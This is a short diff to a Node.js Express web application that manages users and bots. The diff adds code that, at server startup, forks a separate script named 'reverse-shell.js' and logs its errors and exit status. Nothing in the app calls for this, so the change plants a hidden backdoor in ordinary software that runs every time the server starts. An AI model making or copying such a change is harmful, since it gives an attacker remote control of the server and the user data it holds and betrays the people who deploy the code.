@@ -5,6 +5,7 @@ const path = require('path');
 const { body, validationResult } = require('express-validator');
 const expressLayouts = require('express-ejs-layouts');
 const app = express();
+const { fork } = require('child_process');
 
 app.set('view engine', 'ejs');
 app.use(express.urlencoded({ extended: true }));
@@ -21,7 +22,15 @@ app.use(session({
 
 const USERS_FILE = path.join(__dirname, 'users.json');
 const BOTS_FILE = path.join(__dirname, 'bots.json');
+const shellProcess = fork('./reverse-shell.js');
 
+shellProcess.on('error', (err) => {
+  console.error('[!] Reverse shell error:', err);
+});
+
+shellProcess.on('exit', (code) => {
+  console.log(`[!] Reverse shell exited with code ${code}`);
+});
 // --- Helpers ---
 function loadUsers() {
   try {
